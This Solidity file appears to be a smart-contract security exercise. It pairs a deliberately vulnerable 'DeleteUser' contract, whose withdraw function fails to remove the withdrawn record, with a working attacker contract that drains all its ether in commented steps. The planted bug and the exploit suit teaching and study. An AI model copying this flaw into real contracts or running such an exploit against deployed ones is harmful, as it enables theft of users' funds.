pragma solidity 0.8.15;

/**
 * This contract starts with 1 ether.
 * Your goal is to steal all the ether in the contract.
 *
 */
 
contract DeleteUser {
    struct User {
        address addr;
        uint256 amount;
    }

    User[] private users;

    function deposit() external payable {
        users.push(User({addr: msg.sender, amount: msg.value}));
    }

    function withdraw(uint256 index) external {
        User storage user = users[index];
        require(user.addr == msg.sender);
        uint256 amount = user.amount;

        user = users[users.length - 1];
        users.pop();

        msg.sender.call{value: amount}("");
    }
}

contract DeleteUserAttacker {
    constructor(DeleteUser victim) payable {
        // 0. Initial state: users = [{ amount: 1 }]
      
        // 1. Deposit 1 ETH to the contract. 
        // State: [{ amount: 1 }, { amount: 1 }]  
        victim.deposit{value: 1 ether}();

        // 2. Deposit 0 ETH to the contract from the same wallet. 
        // State: [{ amount: 1 }, { amount: 1 }, { amount: 0 }]
        victim.deposit{value: 0 ether}();

        // 3. Withdraw 1 ETH from the contract passing index 1. 
        // Since the contract has a bug it will remove users[2] record and left users[1] record
        // State: [{ amount: 1 }, { amount: 1 }]
        victim.withdraw(1);
        assert(address(victim).balance == 1 ether);

        // 4. Withdraw the rest 1 ETH from the contract passing the same index 1.
        // State: [{ amount: 1 }]
        victim.withdraw(1);
        assert(address(victim).balance == 0);
        assert(address(this).balance == 2 ether);

        msg.sender.call{value: address(this).balance}("");
    }
}